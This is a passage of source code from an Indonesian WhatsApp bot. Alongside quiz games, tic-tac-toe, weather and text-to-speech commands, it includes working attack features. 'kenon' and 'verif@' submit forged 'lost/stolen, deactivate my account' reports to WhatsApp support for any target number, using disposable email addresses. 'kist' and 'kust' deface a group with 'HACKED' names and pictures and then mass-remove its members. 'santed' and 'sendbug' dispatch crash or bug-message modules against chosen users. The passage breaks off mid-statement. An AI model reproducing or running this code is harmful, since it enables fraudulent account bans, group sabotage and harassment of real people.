await zyren.sendButtonText(m.chat, [{ buttonId: "tebak lontong", buttonText: { displayText: "Tebak Lontong" }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete caklontong[m.sender.split("@")[0]]
delete caklontong_desk[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (tebakkalimat.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak kalimat", buttonText: { displayText: "Tebak Kalimat" }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebakkalimat[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (tebaklirik.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak lirik", buttonText: { displayText: "Tebak Lirik" }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebaklirik[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (tebaktebakan.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak tebakan", buttonText: { displayText: "Tebak Tebakan" }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebaktebakan[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
//=================================================//
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith("tictactoe") && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == "PLAYING")
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
//=================================================//
// setReply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
setReply({
"-3": "Game telah berakhir",
"-2": "Invalid",
"-1": "Posisi Invalid",
0: "Posisi Invalid",
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: "❌",
O: "⭕",
1: "1️⃣",
2: "2️⃣",
3: "3️⃣",
4: "4️⃣",
5: "5️⃣",
6: "6️⃣",
7: "7️⃣",
8: "8️⃣",
9: "9️⃣",
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}
${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}
${isWin ? `@${winner.split("@")[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${["❌", "⭕"][1 * room.game._currentTurn]} (@${room.game.currentTurn.split("@")[0]})`}
❌: @${room.game.playerX.split("@")[0]}
⭕: @${room.game.playerO.split("@")[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = m.chat
if (room.x !== room.o) await zyren.sendText(room.x, str, m, { mentions: parseMention(str) } )
await zyren.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}
//=================================================//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ""
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == "wait") {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
zyren.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = "play"
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
zyren.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) zyren.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) zyren.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) zyren.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
zyren.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
setReply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ""}`)
if (!roof.pilih2) zyren.sendText(roof.p2, "_Lawan sudah memilih_\nSekarang giliran kamu", 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
setReply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ""}`)
if (!roof.pilih) zyren.sendText(roof.p, "_Lawan sudah memilih_\nSekarang giliran kamu", 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
zyren.sendText(roof.asal, `_*Hasil Suit*_${tie ? "\nSERI" : ""}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? "" : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? "" : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
if (m.isGroup && zyren.checkDataId("afk", Input, dataId)) {
setReply("Jangan ganggu dia sedang afk") 
}        
if (m.isGroup && zyren.checkDataId("afk", m.sender, dataId)) {
zyren.removeDataId("afk", sender, dataId)
setReply("Kamu telah kembali dari afk") 
}
//=================================================//
if (!m.isGroup && isCmd) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(`${command} [${args.length}]`, "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (m.isGroup && isCmd) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(`${command} [${args.length}]`, "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (!m.isGroup && isText && !budy.length > 20000) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mPRIVATE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(budy, "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (!m.isGroup && isImage) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mIMAGE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Image message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (!m.isGroup && isVideo) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIDEO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Video message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (!m.isGroup && isSticker) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mSTICKER\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Sticker message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (!m.isGroup && isAudio) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mAUDIO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Audio message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (!m.isGroup && isViewOnce) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIEW ONCE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("View once message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"))
}
if (m.isGroup && isViewOnce) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIEW ONCE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("View once message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (m.isGroup && isText && !budy.length > 20000) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mGROUP\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(budy, "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
db.data.users[m.sender].delete = {
type: m.type, 
text: body,
url: "", 
}
}
if (m.isGroup && isImage) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mIMAGE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Image message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (m.isGroup && isVideo) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIDEO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Video message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (m.isGroup && isSticker) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mSTICKER\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Sticker message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (m.isGroup && isAudio) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mAUDIO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Audio message detect", "cyan"), color("from", "gold"), color(`${pushname}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
//=================================================//
switch(command) {
//=================================================//
case "corongmerah:v":
try{
if (!text) return setReply(`Example : ${prefix + command} Ayam Goreng`) 
let { data } = await axios.get("https://saipulanuar.ga/api/download/cariresep?query=" + encodeURI(text)) 
let teks = "Resep Masakan Ala Corong Merah :v \n\n"
for(let x of data.result) {
teks += `Judul : ${x.judul}\n`
teks += `Link : ${x.link}\n\n`
} 
setReply(teks) 
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "ssweb":
if (!text) return setReply(`Example : ${prefix + command} https://github.com/Zyrenn`) 
zyren.sendMessage(m.chat, { image: { url: "https://saipulanuar.ga/api/download/ssweb2?url=" + args[0] }, caption: "Nih kak" }, { quoted: m }) 
break
//=================================================//
case "infocuaca":
try{
if (!text) return setReply(`Example : ${prefix + command} bandung`) 
let { data } = await axios.get("https://saipulanuar.ga/api/info/cuaca?provinsi=jawa-barat&kota=" + encodeURI(text)) 
let teks = "Info Cuaca \n\n"
teks += `Id : ${data.result.id}\n`
teks += `Latitude : ${data.result.latitude}\n`
teks += `Longitude : ${data.result.longitude}\n`
teks += `Coordinate : ${data.result.coordinate}\n`
teks += `Type : ${data.result.type}\n`
teks += `Region : ${data.result.region}\n`
teks += `Level : ${data.result.level}\n`
teks += `Description : ${data.result.description}\n`
teks += `Domain : ${data.result.domain}\n`
teks += `Tags : ${data.result.tags}`
setReply(teks) 
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "updatefile":{
if (!isCreator) return onlyOwner()
if (!isQuotedDocument) return setReply("Reply file!") 
if (!text.includes("./")) return setReply(`*Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return setReply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
setReply(mess.success)
}
break
//=================================================//
case "tts":
try{
let language = [
{"id": "af", "name": "Afrikaans"},
{"id": "sq", "name": "Albanian"},
{"id": "ar", "name": "Arabic"},
{"id": "hy", "name": "Armenian"},
{"id": "ca", "name": "Catalan"},
{"id": "zh", "name": "Chinese"},
{"id": "zh-cn", "name": "Chinese (Mandarin/China)"},
{"id": "zh-tw", "name": "Chinese (Mandarin/Taiwan)"},
{"id": "zh-yue", "name": "Chinese (Cantonese)"},
{"id": "hr", "name": "Croatian"},
{"id": "cs", "name": "Czech"},
{"id": "da", "name": "Danish"},
{"id": "nl", "name": "Dutch"},
{"id": "en", "name": "English"},
{"id": "en-au", "name": "English (Australia)"},
{"id": "en-uk", "name": "English (United Kingdom)"},
{"id": "en-us", "name": "English (United States)"},
{"id": "eo", "name": "Esperanto"},
{"id": "fi", "name": "Finnish"},
{"id": "fr", "name": "French"},
{"id": "de", "name": "German"},
{"id": "el", "name": "Greek"},
{"id": "ht", "name": "Haitian Creole"},
{"id": "hi", "name": "Hindi"},
{"id": "hu", "name": "Hungarian"},
{"id": "is", "name": "Icelandic"},
{"id": "id", "name": "Indonesian"},
{"id": "it", "name": "Italian"},
{"id": "ja", "name": "Japanese"},
{"id": "ko", "name": "Korean"},
{"id": "la", "name": "Latin"},
{"id": "lv", "name": "Latvian"},
{"id": "mk", "name": "Macedonian"},
{"id": "no", "name": "Norwegian"},
{"id": "pl", "name": "Polish"},
{"id": "pt", "name": "Portuguese"},
{"id": "pt-br", "name": "Portuguese (Brazil)"},
{"id": "ro", "name": "Romanian"},
{"id": "ru", "name": "Russian"},
{"id": "sr", "name": "Serbian"},
{"id": "sk", "name": "Slovak"},
{"id": "es", "name": "Spanish"},
{"id": "es-es", "name": "Spanish (Spain)"},
{"id": "es-us", "name": "Spanish (United States)"},
{"id": "sw", "name": "Swahili"},
{"id": "sv", "name": "Swedish"},
{"id": "ta", "name": "Tamil"},
{"id": "th", "name": "Thai"},
{"id": "tr", "name": "Turkish"},
{"id": "vi", "name": "Vietnamese"},
{"id": "cy", "name": "Welsh"}
]
let data = language.map((x) => x.id)
if (data.includes(text.split("|")[0]) && text.split("|")[1]) {
zyren.sendMessage(m.chat, { audio: { url: "https://saipulanuar.ga/api/text-to-audio/tts?text=" + encodeURI(text.split("|")[1]) + "&idbahasa=" + text.split("|")[0] }, mimetype: "audio/mp4" }, { quoted: m })
} else if (text.split("|")[0] && !data.includes(text)) {
let listLanguage = []
for (let x of language) {
listLanguage.push({
title: x.name,
rowId: `${prefix + command} ${x.id}|${text}`,
description: `Language ${x.name}`
})
}
const sections = [
{title: "Total Language" + language.length,
rows: listLanguage }]
const listMessage = {
text: `📂 LANGUAGE`,
buttonText: "Click Here",
sections
}
zyren.sendMessage(m.chat, listMessage, { quoted: m })
} else setReply("Text?") 
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "removebg":
try{
if (isImage || isQuotedImage) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await removebg(media)
await zyren.sendMessage(m.chat, { image: anu, caption: mess.success }, { quoted: m })
} else if (isQuotedSticker) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
exec(`ffmpeg -i ${media} ./media/sampahnye/${fileName + 1}.png`, async (err) => {
const anu = await removebg(`./media/sampahnye/${fileName + 1}.png`)
await zyren.sendImageAsSticker(m.chat, anu, m, { packname: global.packname, author: global.author })
})
} else setReply(`Use photos or Reply photos/sticker with captions ${prefix + command}`)
} catch (e) {
console.log(e) 
//setReply("Maaf kak fiture ini sedang error")
}
break
//=================================================//
//VERIF//
case "kenon": {
if (!isCreator) return onlyOwner()
if (Input) {
let cekno = await zyren.onWhatsApp(Input)
if (cekno.length == 0) return setReply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == ownerNumber + "@s.whatsapp.net") return setReply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
setReply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
setReply(`Sedang Limit Tunggu Beberapa Saat.`)
} else setReply(util.format(res.data))
} catch (err) {setReply(`${err}`)}
} else setReply('Masukkan Nomor Target!')
}
break
case "verif@": {
if (!isCreator) return onlyOwner()
if (Input) {
let cekno = await zyren.onWhatsApp(Input)
if (cekno.length == 0) return setReply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == ownerNumber + "@s.whatsapp.net") return setReply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
setReply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
setReply(`Sedang Limit Tunggu Beberapa Saat.`)
} else setReply(util.format(res.data))
} catch (err) {setReply(`${err}`)}
} else setReply('Masukkan Nomor Target!')
}
break
//MERETAS GROUP//
//=================================================//
case "retasgc":
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
hack = [
{
title: `MERETAS GROUP WA`,
rows: [
{title: "HACK NOW", rowId: `kos`, description: `PROCESSING!!`},
]
}
]
zyren.sendListMsg(m.chat, `MODE PERETASAN CLICK OPTION`, "BY PAK TZY", `RETAS GROUP`, `OPTION`, hack, m)
break
 case "kos": {
if (!isCreator) return onlyOwner()
asd = `CLICK TAHAP 1 DAN 2`
let buttonsMode = [
{buttonId: `${prefix}kist`, buttonText: {displayText: "𝚃𝙰𝙷𝙰𝙿 1"}, type: 1},
{buttonId: `${prefix}kust`, buttonText: {displayText: "𝚃𝙰𝙷𝙰𝙿 2"}, type: 1}
]
let buttonMessageVote = {
text: asd,
footer: copyright,
buttons: buttonsMode,
headerType: 1
}
zyren.sendMessage(m.chat, buttonMessageVote)
}
break
case "kist": {
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
setReply("Load...")
await sleep(10000)
let teks = `GRUP TELAH DIRETAS BY PAK TZY!!`
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("../basetzy/lib/myfunc")
var { img } = await generateProfilePicture("https://a.uguu.se/zRMfrPTW.jpg")
await zyren.query({ tag: "iq",  attrs: { to: m.chat, type:"set", xmlns: "w:profile:picture"}, content: [{ tag: "picture", attrs: { type: "image" }, content: img }]})
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.groupUpdateDescription(m.chat, teks)
} else { 
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/zRMfrPTW.jpg" }) 
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: "https://a.uguu.se/URVUiKwf.jpg" }) 
await zyren.groupUpdateDescription(m.chat, "PROCESSING")
await zyren.groupUpdateSubject(m.chat, "GROUP TELAH DIRETAS!!")
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED") }
} catch { }
setReply("BY PAK TZY!!")
}
break
case "kust":{
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
setReply("Waiting For Complete..")
await sleep(10000)
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== ownerNumber + "@s.whatsapp.net") {
zyren.groupParticipantsUpdate(m.chat, [x], "remove")
await sleep(1000) 
}}}
break
//=================================================//
//=================================================//
case "santed":
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (mentionByReply) {
require("../basetzy/santed/indexByReply")(zyren, m, prefix, command, mentionByReply)
} else if (mentionByTag[0] && m.isGroup) {
require("../basetzy/santed/indexByTag")(zyren, m, prefix, command, mentionByTag)
} else if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/santed/indexByNumber")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/santed/indexOrg")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
require("../basetzy/santed/santed")(zyren, setReply, text, sleep)
}
break
case "santedgc":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Masukkan Link Group!")
if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
if (!text.split("|")[0].includes("https://chat.whatsapp.com/")) return setReply("Itu bukan link group")
require("../basetzy/santed/indexLink")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/santed/indexGc")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
require("../basetzy/santed/santedGc")(zyren, setReply, text, sleep)
}
break
case "sendbug":
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (mentionByReply) {
require("../basetzy/sendbug/bagian1/indexByReply")(zyren, m, prefix, command, mentionByReply)
} else if (mentionByTag[0] && m.isGroup) {
require("../basetzy/sendbug/bagian1/indexByTag")(zyren, m, prefix, command, mentionByTag)
} else if (text.split("|")[0] && !text.split("|")[1]) {
require("../basetzy/sendbug/bagian1/indexByNumber")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1]) {
